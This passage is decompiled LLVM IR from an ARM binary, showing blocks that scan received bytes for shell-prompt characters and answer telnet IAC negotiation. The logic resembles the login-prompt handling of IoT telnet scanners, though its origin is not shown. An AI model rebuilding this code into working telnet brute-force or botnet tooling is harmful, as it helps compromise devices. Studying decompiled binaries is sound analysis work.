  %v2_f1d4 = icmp eq i32 %v1_f1d0, 0
  store i1 %v2_f1d4, i1* %cpsr_z.global-to-local, align 1
  %tmp430 = icmp slt i32 %v1_f1d0, 1
  br i1 %tmp430, label %dec_label_pc_ef38.backedge.thread, label %dec_label_pc_f1dc

dec_label_pc_f1dc:                                ; preds = %dec_label_pc_f1cc
  %v2_f1dc = add i32 %v1_f1d0, %v0_efb4
  store i32 %v2_f1dc, i32* %r3.global-to-local, align 4
  %v1_f1e0 = add i32 %v2_f1dc, 28
  %v2_f1e0 = inttoptr i32 %v1_f1e0 to i8*
  %v3_f1e0 = load i8, i8* %v2_f1e0, align 1
  %v4_f1e0 = zext i8 %v3_f1e0 to i32
  store i32 %v4_f1e0, i32* %r3.global-to-local, align 4
  %v2_f1e4 = icmp ugt i8 %v3_f1e0, 61
  store i1 %v2_f1e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f1e4 = icmp eq i8 %v3_f1e0, 62
  store i1 %v7_f1e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1e4, label %dec_label_pc_f248, label %bb431

bb431:                                            ; preds = %dec_label_pc_f1dc
  %v3_f1e8 = icmp ugt i8 %v3_f1e0, 57
  store i1 %v3_f1e8, i1* %cpsr_c.global-to-local, align 1
  %v8_f1e8 = icmp eq i8 %v3_f1e0, 58
  store i1 %v8_f1e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1e8, label %dec_label_pc_f248, label %dec_label_pc_f1f0

dec_label_pc_f1f0:                                ; preds = %bb431
  %v2_f1f0 = icmp ugt i8 %v3_f1e0, 35
  store i1 %v2_f1f0, i1* %cpsr_c.global-to-local, align 1
  %v7_f1f0 = icmp eq i8 %v3_f1e0, 36
  store i1 %v7_f1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1f0, label %dec_label_pc_f248, label %dec_label_pc_f1f8

dec_label_pc_f1f8:                                ; preds = %dec_label_pc_f1f0
  %v2_f1f8 = icmp ugt i8 %v3_f1e0, 34
  store i1 %v2_f1f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1f8 = icmp eq i8 %v3_f1e0, 35
  store i1 %v7_f1f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1f8, label %dec_label_pc_f248, label %dec_label_pc_f200

dec_label_pc_f200:                                ; preds = %dec_label_pc_f1f8
  %v2_f200 = icmp ugt i8 %v3_f1e0, 36
  store i1 %v2_f200, i1* %cpsr_c.global-to-local, align 1
  %v7_f200 = icmp eq i8 %v3_f1e0, 37
  store i1 %v7_f200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f200, label %dec_label_pc_f248, label %dec_label_pc_f230.preheader

dec_label_pc_f230.preheader:                      ; preds = %dec_label_pc_f200
  %v3_f204 = add i32 %v0_efb4, 28
  %v2_f208 = add i32 %v3_f204, %v3_f1cc
  store i32 %v2_f208, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f230

dec_label_pc_f214:                                ; preds = %bb432
  %v2_f214 = icmp ugt i8 %v3_f238, 35
  store i1 %v2_f214, i1* %cpsr_c.global-to-local, align 1
  %v7_f214 = icmp eq i8 %v3_f238, 36
  store i1 %v7_f214, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f214, label %dec_label_pc_f248, label %dec_label_pc_f21c

dec_label_pc_f21c:                                ; preds = %dec_label_pc_f214
  %v2_f21c = icmp ugt i8 %v3_f238, 34
  store i1 %v2_f21c, i1* %cpsr_c.global-to-local, align 1
  %v7_f21c = icmp eq i8 %v3_f238, 35
  store i1 %v7_f21c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f21c, label %dec_label_pc_f248, label %dec_label_pc_f224

dec_label_pc_f224:                                ; preds = %dec_label_pc_f21c
  %v2_f224 = icmp ugt i8 %v3_f238, 36
  store i1 %v2_f224, i1* %cpsr_c.global-to-local, align 1
  %v7_f224 = icmp eq i8 %v3_f238, 37
  store i1 %v7_f224, i1* %cpsr_z.global-to-local, align 1
  %v1_f228 = add i32 %v0_f228, -1
  store i32 %v1_f228, i32* %r3.global-to-local, align 4
  br i1 %v7_f224, label %dec_label_pc_f248, label %dec_label_pc_f230

dec_label_pc_f230:                                ; preds = %dec_label_pc_f230.preheader, %dec_label_pc_f224
  %v0_f228 = phi i32 [ %v2_f208, %dec_label_pc_f230.preheader ], [ %v1_f228, %dec_label_pc_f224 ]
  %v0_f230 = phi i32 [ %v1_f1d0, %dec_label_pc_f230.preheader ], [ %v1_f230, %dec_label_pc_f224 ]
  %v1_f230 = add i32 %v0_f230, -1
  store i32 %v1_f230, i32* %r1.global-to-local, align 4
  %v2_f230 = icmp ne i32 %v0_f230, 0
  store i1 %v2_f230, i1* %cpsr_c.global-to-local, align 1
  %v7_f230 = icmp eq i32 %v0_f230, 1
  store i1 %v7_f230, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f230, label %dec_label_pc_ef38.backedge.thread561, label %dec_label_pc_f238

dec_label_pc_f238:                                ; preds = %dec_label_pc_f230
  %v1_f238 = add i32 %v0_f228, -2
  %v2_f238 = inttoptr i32 %v1_f238 to i8*
  %v3_f238 = load i8, i8* %v2_f238, align 1
  %v4_f238 = zext i8 %v3_f238 to i32
  store i32 %v4_f238, i32* %r2.global-to-local, align 4
  %v2_f23c = icmp ugt i8 %v3_f238, 61
  store i1 %v2_f23c, i1* %cpsr_c.global-to-local, align 1
  %v7_f23c = icmp eq i8 %v3_f238, 62
  store i1 %v7_f23c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f23c, label %dec_label_pc_f248, label %bb432

bb432:                                            ; preds = %dec_label_pc_f238
  %v3_f240 = icmp ugt i8 %v3_f238, 57
  store i1 %v3_f240, i1* %cpsr_c.global-to-local, align 1
  %v8_f240 = icmp eq i8 %v3_f238, 58
  store i1 %v8_f240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f240, label %dec_label_pc_f248, label %dec_label_pc_f214

dec_label_pc_f248:                                ; preds = %dec_label_pc_f238, %bb432, %dec_label_pc_f224, %dec_label_pc_f21c, %dec_label_pc_f214, %dec_label_pc_f200, %dec_label_pc_f1dc, %dec_label_pc_f1f8, %dec_label_pc_f1f0, %bb431
  %v0_f24c = phi i32 [ %v1_f1d0, %dec_label_pc_f200 ], [ %v1_f1d0, %dec_label_pc_f1dc ], [ %v1_f1d0, %dec_label_pc_f1f8 ], [ %v1_f1d0, %dec_label_pc_f1f0 ], [ %v1_f1d0, %bb431 ], [ %v1_f230, %dec_label_pc_f214 ], [ %v1_f230, %dec_label_pc_f21c ], [ %v1_f230, %dec_label_pc_f224 ], [ %v1_f230, %bb432 ], [ %v1_f230, %dec_label_pc_f238 ]
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f24c = add i32 %v0_f24c, 1
  store i32 %v1_f24c, i32* @r7, align 4
  %v1_f250 = call i32 @function_fd64(i32 9)
  store i32 %v2_f7e8, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_f260 = call i32 @function_fca0(i32 9, i32* nonnull %stack_var_-60)
  store i32 %v3_f260, i32* %r0.global-to-local, align 4
  %v3_f264 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f264, i32* %r2.global-to-local, align 4
  store i32 %v3_f260, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f270 = load i32, i32* @r6, align 4
  %v1_f270 = add i32 %v0_f270, 4
  %v2_f270 = inttoptr i32 %v1_f270 to i32*
  %v3_f270 = load i32, i32* %v2_f270, align 4
  store i32 %v3_f270, i32* %r0.global-to-local, align 4
  %v4_f274 = call i32 @function_11538(i32 %v3_f270, i32 %v3_f260, i32 %v3_f264, i32 16384)
  store i32 %v4_f274, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f284 = load i32, i32* @r6, align 4
  %v1_f284 = add i32 %v0_f284, 4
  %v2_f284 = inttoptr i32 %v1_f284 to i32*
  %v3_f284 = load i32, i32* %v2_f284, align 4
  store i32 %v3_f284, i32* %r0.global-to-local, align 4
  %v4_f288 = call i32 @function_11538(i32 %v3_f284, i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32 2, i32 16384)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f290 = call i32 @function_fcc4(i32 9)
  store i32 %v1_f290, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_f298 = load i32, i32* @r6, align 4
  %v2_f298 = add i32 %v1_f298, 12
  %v3_f298 = inttoptr i32 %v2_f298 to i32*
  store i32 9, i32* %v3_f298, align 4
  br label %dec_label_pc_f0d0

dec_label_pc_f2a0:                                ; preds = %dec_label_pc_efb4
  %v1_f2a0 = add i32 %v0_efb4, 24
  %v2_f2a0 = inttoptr i32 %v1_f2a0 to i32*
  %v3_f2a0 = load i32, i32* %v2_f2a0, align 4
  store i32 %v3_f2a0, i32* %r1.global-to-local, align 4
  %v0_f2a4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f2a4, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_f2ac166 = icmp eq i32 %v3_f2a0, 0
  store i1 %v3_f2ac166, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f2ac166, i1* %cpsr_z.global-to-local, align 1
  %v6_f2b0173 = icmp sgt i32 %v3_f2a0, 0
  br i1 %v6_f2b0173, label %dec_label_pc_f2b4.preheader, label %dec_label_pc_f360

dec_label_pc_f2ac.loopexit:                       ; preds = %dec_label_pc_f2d0
  %v2_f2d8 = add i32 %v1_f2d8, 2
  store i32 %v2_f2d8, i32* @r4, align 4
  %v2_f2dc = add i32 %v1_f2dc, 2
  store i32 %v2_f2dc, i32* @r7, align 4
  %v3_f2ac = icmp uge i32 %v2_f2dc, %v1_f2ac
  store i1 %v3_f2ac, i1* %cpsr_c.global-to-local, align 1
  %v9_f2ac = icmp eq i32 %v2_f2dc, %v1_f2ac
  store i1 %v9_f2ac, i1* %cpsr_z.global-to-local, align 1
  %v6_f2b0 = icmp slt i32 %v2_f2dc, %v1_f2ac
  br i1 %v6_f2b0, label %dec_label_pc_f2b4.preheader, label %dec_label_pc_f360

dec_label_pc_f2b4.preheader:                      ; preds = %dec_label_pc_f2a0, %dec_label_pc_f2ac.loopexit
  %v6_f368273 = phi i32 [ %v6_f368274, %dec_label_pc_f2ac.loopexit ], [ %v0_efb4, %dec_label_pc_f2a0 ]
  %v1_f2dc262 = phi i32 [ %v2_f2dc, %dec_label_pc_f2ac.loopexit ], [ 0, %dec_label_pc_f2a0 ]
  %v1_f2c0260 = phi i32 [ %v1_f2ac, %dec_label_pc_f2ac.loopexit ], [ %v3_f2a0, %dec_label_pc_f2a0 ]
  %v0_f2b4258 = phi i32 [ %v2_f2d8, %dec_label_pc_f2ac.loopexit ], [ %v0_f2a4, %dec_label_pc_f2a0 ]
  br label %dec_label_pc_f2b4

dec_label_pc_f2b4:                                ; preds = %dec_label_pc_f2b4.preheader, %dec_label_pc_f344
  %v6_f368274 = phi i32 [ %v6_f368273, %dec_label_pc_f2b4.preheader ], [ %v0_f34c, %dec_label_pc_f344 ]
  %v1_f2dc = phi i32 [ %v1_f2dc262, %dec_label_pc_f2b4.preheader ], [ %v1_f350, %dec_label_pc_f344 ]
  %v1_f2ac = phi i32 [ %v1_f2c0260, %dec_label_pc_f2b4.preheader ], [ %v3_f34c, %dec_label_pc_f344 ]
  %v1_f2d8 = phi i32 [ %v0_f2b4258, %dec_label_pc_f2b4.preheader ], [ %v1_f358, %dec_label_pc_f344 ]
  %v1_f2b4 = inttoptr i32 %v1_f2d8 to i8*
  %v2_f2b4 = load i8, i8* %v1_f2b4, align 1
  %v3_f2b4 = zext i8 %v2_f2b4 to i32
  store i32 %v3_f2b4, i32* @r3, align 4
  %v2_f2b8 = icmp eq i8 %v2_f2b4, -1
  store i1 %v2_f2b8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f2b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2b8, label %dec_label_pc_f2c0, label %dec_label_pc_f360

dec_label_pc_f2c0:                                ; preds = %dec_label_pc_f2b4
  %v0_f2c0 = load i32, i32* %sb.global-to-local, align 4
  %v2_f2c0 = add i32 %v0_f2c0, %v1_f2ac
  store i32 %v2_f2c0, i32* %r2.global-to-local, align 4
  %v1_f2c4 = add i32 %v1_f2d8, 1
  store i32 %v1_f2c4, i32* @r5, align 4
  %v3_f2c8 = icmp uge i32 %v2_f2c0, %v1_f2c4
  store i1 %v3_f2c8, i1* %cpsr_c.global-to-local, align 1
  %v9_f2c8 = icmp eq i32 %v2_f2c0, %v1_f2c4
  store i1 %v9_f2c8, i1* %cpsr_z.global-to-local, align 1
  %v2_f2cc = xor i1 %v3_f2c8, true
  %v3_f2cc = or i1 %v9_f2c8, %v2_f2cc
  br i1 %v3_f2cc, label %dec_label_pc_f360, label %dec_label_pc_f2d0

dec_label_pc_f2d0:                                ; preds = %dec_label_pc_f2c0
  %v2_f2d0 = inttoptr i32 %v1_f2c4 to i8*
  %v3_f2d0 = load i8, i8* %v2_f2d0, align 1
  %v4_f2d0 = zext i8 %v3_f2d0 to i32
  store i32 %v4_f2d0, i32* @r3, align 4
  %v2_f2d4 = icmp eq i8 %v3_f2d0, -1
  store i1 %v2_f2d4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f2d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2d4, label %dec_label_pc_f2ac.loopexit, label %dec_label_pc_f2e4

dec_label_pc_f2e4:                                ; preds = %dec_label_pc_f2d0
  %v2_f2e4 = icmp ugt i8 %v3_f2d0, -4
  store i1 %v2_f2e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f2e4 = icmp eq i8 %v3_f2d0, -3
  store i1 %v7_f2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2e4, label %dec_label_pc_f878, label %dec_label_pc_f2ec

dec_label_pc_f2ec:                                ; preds = %dec_label_pc_f2e4
  %v1_f2ec = add i32 %v1_f2d8, 2
  store i32 %v1_f2ec, i32* @r3, align 4
  %v3_f2f0 = icmp uge i32 %v2_f2c0, %v1_f2ec
  store i1 %v3_f2f0, i1* %cpsr_c.global-to-local, align 1
  %v9_f2f0 = icmp eq i32 %v2_f2c0, %v1_f2ec
  store i1 %v9_f2f0, i1* %cpsr_z.global-to-local, align 1
  %v2_f2f4 = xor i1 %v3_f2f0, true
  %v3_f2f4 = or i1 %v9_f2f0, %v2_f2f4
  br i1 %v3_f2f4, label %dec_label_pc_f360, label %dec_label_pc_f2f8

dec_label_pc_f2f8:                                ; preds = %dec_label_pc_f8dc, %bb454, %.thread138, %dec_label_pc_f2ec
  %v0_f2f8 = load i32, i32* @r5, align 4
  %v1_f2f8 = inttoptr i32 %v0_f2f8 to i8*
  %v2_f2f8 = load i8, i8* %v1_f2f8, align 1
  %v3_f2f8 = zext i8 %v2_f2f8 to i32
  store i32 %v3_f2f8, i32* %r3.global-to-local, align 4
  %v2_f2fc = icmp ugt i8 %v2_f2f8, -4
  store i1 %v2_f2fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f2fc = icmp eq i8 %v2_f2f8, -3
  store i1 %v7_f2fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2fc, label %.thread96, label %dec_label_pc_f30c

.thread96:                                        ; preds = %dec_label_pc_f2f8
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f2f8, align 1
  %v0_f308.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f308.pr.pr, label %.thread99, label %.thread96.dec_label_pc_f30cthread-pre-split_crit_edge

.thread96.dec_label_pc_f30cthread-pre-split_crit_edge: ; preds = %.thread96
  %v0_f30c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f30c

dec_label_pc_f30c:                                ; preds = %dec_label_pc_f2f8, %.thread96.dec_label_pc_f30cthread-pre-split_crit_edge
  %v0_f30c.pr = phi i32 [ %v0_f30c.pr.pre, %.thread96.dec_label_pc_f30cthread-pre-split_crit_edge ], [ %v3_f2f8, %dec_label_pc_f2f8 ]
  %v2_f30c = icmp ugt i32 %v0_f30c.pr, 250
  store i1 %v2_f30c, i1* %cpsr_c.global-to-local, align 1
  %v7_f30c = icmp eq i32 %v0_f30c.pr, 251
  store i1 %v7_f30c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f30c, label %bb433, label %.thread99

bb433:                                            ; preds = %dec_label_pc_f30c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f314 = load i32, i32* @r5, align 4
  %v4_f314 = inttoptr i32 %v3_f314 to i8*
  store i8 -3, i8* %v4_f314, align 1
  br label %.thread99

.thread99:                                        ; preds = %dec_label_pc_f30c, %.thread96, %bb433
  %v0_f318 = load i32, i32* @r4, align 4
  %v1_f318 = add i32 %v0_f318, 2
  %v2_f318 = inttoptr i32 %v1_f318 to i8*
  %v3_f318 = load i8, i8* %v2_f318, align 1
  %v4_f318 = zext i8 %v3_f318 to i32
  store i32 %v4_f318, i32* %r3.global-to-local, align 4
  %v2_f31c = icmp ugt i8 %v3_f318, -4
  store i1 %v2_f31c, i1* %cpsr_c.global-to-local, align 1
  %v7_f31c = icmp eq i8 %v3_f318, -3
  store i1 %v7_f31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f31c, label %.thread100, label %dec_label_pc_f32c

.thread100:                                       ; preds = %.thread99
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_f318, align 1
  %v0_f328.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f328.pr.pr, label %.thread103, label %.thread100.dec_label_pc_f32cthread-pre-split_crit_edge

.thread100.dec_label_pc_f32cthread-pre-split_crit_edge: ; preds = %.thread100
  %v0_f32c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f32c

dec_label_pc_f32c:                                ; preds = %.thread99, %.thread100.dec_label_pc_f32cthread-pre-split_crit_edge
  %v0_f32c.pr = phi i32 [ %v0_f32c.pr.pre, %.thread100.dec_label_pc_f32cthread-pre-split_crit_edge ], [ %v4_f318, %.thread99 ]
  %v2_f32c = icmp ugt i32 %v0_f32c.pr, 250
  store i1 %v2_f32c, i1* %cpsr_c.global-to-local, align 1
  %v7_f32c = icmp eq i32 %v0_f32c.pr, 251
  store i1 %v7_f32c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f32c, label %bb434, label %.thread103

bb434:                                            ; preds = %dec_label_pc_f32c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f334 = load i32, i32* @r4, align 4
  %v4_f334 = add i32 %v3_f334, 2
  %v5_f334 = inttoptr i32 %v4_f334 to i8*
  store i8 -3, i8* %v5_f334, align 1
  br label %.thread103

.thread103:                                       ; preds = %dec_label_pc_f32c, %.thread100, %bb434
  %v0_f338 = load i32, i32* @r6, align 4
  %v1_f338 = add i32 %v0_f338, 4
  %v2_f338 = inttoptr i32 %v1_f338 to i32*
  %v3_f338 = load i32, i32* %v2_f338, align 4
  store i32 %v3_f338, i32* %r0.global-to-local, align 4
  %v0_f33c = load i32, i32* @r4, align 4
  br label %dec_label_pc_f344

dec_label_pc_f344:                                ; preds = %dec_label_pc_f9f0, %.thread103
  %v0_f348 = phi i32 [ %v3_fa04, %dec_label_pc_f9f0 ], [ %v3_f338, %.thread103 ]
  %storemerge4 = phi i32 [ %v2_f890, %dec_label_pc_f9f0 ], [ %v0_f33c, %.thread103 ]
  %storemerge3 = phi i32 [ 9, %dec_label_pc_f9f0 ], [ 3, %.thread103 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* @r3, align 4
  %v4_f348 = call i32 @function_11538(i32 %v0_f348, i32 %storemerge4, i32 %storemerge3, i32 16384)
  store i32 %v4_f348, i32* %r0.global-to-local, align 4
  %v0_f34c = load i32, i32* @r6, align 4
  %v1_f34c = add i32 %v0_f34c, 24
  %v2_f34c = inttoptr i32 %v1_f34c to i32*
  %v3_f34c = load i32, i32* %v2_f34c, align 4
  store i32 %v3_f34c, i32* %r1.global-to-local, align 4
  %v0_f350 = load i32, i32* @r7, align 4
  %v1_f350 = add i32 %v0_f350, 3
  store i32 %v1_f350, i32* @r7, align 4
  %v3_f354 = icmp uge i32 %v1_f350, %v3_f34c
  store i1 %v3_f354, i1* %cpsr_c.global-to-local, align 1
  %v9_f354 = icmp eq i32 %v1_f350, %v3_f34c
  store i1 %v9_f354, i1* %cpsr_z.global-to-local, align 1
  %v0_f358 = load i32, i32* @r4, align 4
  %v1_f358 = add i32 %v0_f358, 3
  store i32 %v1_f358, i32* @r4, align 4
  %v5_f35c = icmp slt i32 %v1_f350, %v3_f34c
  br i1 %v5_f35c, label %dec_label_pc_f2b4, label %dec_label_pc_f360

dec_label_pc_f360:                                ; preds = %dec_label_pc_f2ac.loopexit, %dec_label_pc_f2b4, %dec_label_pc_f344, %dec_label_pc_f2ec, %dec_label_pc_f2c0, %dec_label_pc_f2a0, %dec_label_pc_f878.dec_label_pc_f360.loopexit_crit_edge
  %v6_f368 = phi i32 [ %v0_f8a8, %dec_label_pc_f878.dec_label_pc_f360.loopexit_crit_edge ], [ %v0_efb4, %dec_label_pc_f2a0 ], [ %v6_f368274, %dec_label_pc_f2b4 ], [ %v0_f34c, %dec_label_pc_f344 ], [ %v6_f368274, %dec_label_pc_f2ec ], [ %v6_f368274, %dec_label_pc_f2c0 ], [ %v6_f368274, %dec_label_pc_f2ac.loopexit ]
  %v0_f360 = phi i32 [ %v0_f360.pre.pre, %dec_label_pc_f878.dec_label_pc_f360.loopexit_crit_edge ], [ 0, %dec_label_pc_f2a0 ], [ %v1_f2dc, %dec_label_pc_f2b4 ], [ %v1_f350, %dec_label_pc_f344 ], [ %v1_f2dc, %dec_label_pc_f2ec ], [ %v1_f2dc, %dec_label_pc_f2c0 ], [ %v2_f2dc, %dec_label_pc_f2ac.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f360 = icmp eq i32 %v0_f360, 0
  store i1 %v2_f360, i1* %cpsr_z.global-to-local, align 1
  %tmp435 = icmp slt i32 %v0_f360, 1
  br i1 %tmp435, label %dec_label_pc_f74c, label %bb436

bb436:                                            ; preds = %dec_label_pc_f360
  store i32 3, i32* @r3, align 4
  %v7_f368 = add i32 %v6_f368, 12
  %v8_f368 = inttoptr i32 %v7_f368 to i32*
  store i32 3, i32* %v8_f368, align 4
  br label %dec_label_pc_f74c

dec_label_pc_f370:                                ; preds = %dec_label_pc_efb4
  %v1_f370 = add i32 %v0_efb4, 24
  %v2_f370 = inttoptr i32 %v1_f370 to i32*
  %v3_f370 = load i32, i32* %v2_f370, align 4
  store i32 %v3_f370, i32* %r2.global-to-local, align 4
  %v1_f374 = add i32 %v3_f370, -1
  store i32 %v1_f374, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f378 = icmp eq i32 %v1_f374, 0
  store i1 %v2_f378, i1* %cpsr_z.global-to-local, align 1
  %tmp437 = icmp slt i32 %v1_f374, 1
  br i1 %tmp437, label %dec_label_pc_ef38.backedge.thread, label %dec_label_pc_f380

dec_label_pc_f380:                                ; preds = %dec_label_pc_f370
  %v2_f380 = add i32 %v1_f374, %v0_efb4
  store i32 %v2_f380, i32* %r3.global-to-local, align 4
  %v1_f384 = add i32 %v2_f380, 28
  %v2_f384 = inttoptr i32 %v1_f384 to i8*
  %v3_f384 = load i8, i8* %v2_f384, align 1
  %v4_f384 = zext i8 %v3_f384 to i32
  store i32 %v4_f384, i32* %r3.global-to-local, align 4
  %v2_f388 = icmp ugt i8 %v3_f384, 61
  store i1 %v2_f388, i1* %cpsr_c.global-to-local, align 1
  %v7_f388 = icmp eq i8 %v3_f384, 62
  store i1 %v7_f388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f388, label %dec_label_pc_f3ec, label %bb438

bb438:                                            ; preds = %dec_label_pc_f380
  %v3_f38c = icmp ugt i8 %v3_f384, 57
  store i1 %v3_f38c, i1* %cpsr_c.global-to-local, align 1
  %v8_f38c = icmp eq i8 %v3_f384, 58
  store i1 %v8_f38c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f38c, label %dec_label_pc_f3ec, label %dec_label_pc_f394

dec_label_pc_f394:                                ; preds = %bb438
  %v2_f394 = icmp ugt i8 %v3_f384, 35
  store i1 %v2_f394, i1* %cpsr_c.global-to-local, align 1
  %v7_f394 = icmp eq i8 %v3_f384, 36
  store i1 %v7_f394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f394, label %dec_label_pc_f3ec, label %dec_label_pc_f39c

dec_label_pc_f39c:                                ; preds = %dec_label_pc_f394
  %v2_f39c = icmp ugt i8 %v3_f384, 34
  store i1 %v2_f39c, i1* %cpsr_c.global-to-local, align 1
  %v7_f39c = icmp eq i8 %v3_f384, 35
  store i1 %v7_f39c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f39c, label %dec_label_pc_f3ec, label %dec_label_pc_f3a4

dec_label_pc_f3a4:                                ; preds = %dec_label_pc_f39c
  %v2_f3a4 = icmp ugt i8 %v3_f384, 36
  store i1 %v2_f3a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3a4 = icmp eq i8 %v3_f384, 37
  store i1 %v7_f3a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3a4, label %dec_label_pc_f3ec, label %dec_label_pc_f3d4.preheader

dec_label_pc_f3d4.preheader:                      ; preds = %dec_label_pc_f3a4
  %v3_f3a8 = add i32 %v0_efb4, 28
  %v2_f3ac = add i32 %v3_f3a8, %v3_f370
  store i32 %v2_f3ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f3d4

dec_label_pc_f3b8:                                ; preds = %bb439
  %v2_f3b8 = icmp ugt i8 %v3_f3dc, 35
  store i1 %v2_f3b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f3b8 = icmp eq i8 %v3_f3dc, 36
  store i1 %v7_f3b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3b8, label %dec_label_pc_f3ec, label %dec_label_pc_f3c0

dec_label_pc_f3c0:                                ; preds = %dec_label_pc_f3b8
  %v2_f3c0 = icmp ugt i8 %v3_f3dc, 34
  store i1 %v2_f3c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f3c0 = icmp eq i8 %v3_f3dc, 35
  store i1 %v7_f3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3c0, label %dec_label_pc_f3ec, label %dec_label_pc_f3c8

dec_label_pc_f3c8:                                ; preds = %dec_label_pc_f3c0
  %v2_f3c8 = icmp ugt i8 %v3_f3dc, 36
  store i1 %v2_f3c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f3c8 = icmp eq i8 %v3_f3dc, 37
  store i1 %v7_f3c8, i1* %cpsr_z.global-to-local, align 1
  %v1_f3cc = add i32 %v0_f3cc, -1
  store i32 %v1_f3cc, i32* %r3.global-to-local, align 4
  br i1 %v7_f3c8, label %dec_label_pc_f3ec, label %dec_label_pc_f3d4

dec_label_pc_f3d4:                                ; preds = %dec_label_pc_f3d4.preheader, %dec_label_pc_f3c8
  %v0_f3cc = phi i32 [ %v2_f3ac, %dec_label_pc_f3d4.preheader ], [ %v1_f3cc, %dec_label_pc_f3c8 ]
  %v0_f3d4 = phi i32 [ %v1_f374, %dec_label_pc_f3d4.preheader ], [ %v1_f3d4, %dec_label_pc_f3c8 ]
  %v1_f3d4 = add i32 %v0_f3d4, -1
  store i32 %v1_f3d4, i32* %r1.global-to-local, align 4
  %v2_f3d4 = icmp ne i32 %v0_f3d4, 0
  store i1 %v2_f3d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3d4 = icmp eq i32 %v0_f3d4, 1
  store i1 %v7_f3d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3d4, label %dec_label_pc_ef38.backedge.thread561, label %dec_label_pc_f3dc

dec_label_pc_f3dc:                                ; preds = %dec_label_pc_f3d4
  %v1_f3dc = add i32 %v0_f3cc, -2
  %v2_f3dc = inttoptr i32 %v1_f3dc to i8*
  %v3_f3dc = load i8, i8* %v2_f3dc, align 1
  %v4_f3dc = zext i8 %v3_f3dc to i32
  store i32 %v4_f3dc, i32* %r2.global-to-local, align 4
  %v2_f3e0 = icmp ugt i8 %v3_f3dc, 61
  store i1 %v2_f3e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f3e0 = icmp eq i8 %v3_f3dc, 62
  store i1 %v7_f3e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3e0, label %dec_label_pc_f3ec, label %bb439

bb439:                                            ; preds = %dec_label_pc_f3dc
  %v3_f3e4 = icmp ugt i8 %v3_f3dc, 57
  store i1 %v3_f3e4, i1* %cpsr_c.global-to-local, align 1
  %v8_f3e4 = icmp eq i8 %v3_f3dc, 58
  store i1 %v8_f3e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f3e4, label %dec_label_pc_f3ec, label %dec_label_pc_f3b8

dec_label_pc_f3ec:                                ; preds = %dec_label_pc_f3dc, %bb439, %dec_label_pc_f3c8, %dec_label_pc_f3c0, %dec_label_pc_f3b8, %dec_label_pc_f3a4, %dec_label_pc_f380, %dec_label_pc_f39c, %dec_label_pc_f394, %bb438
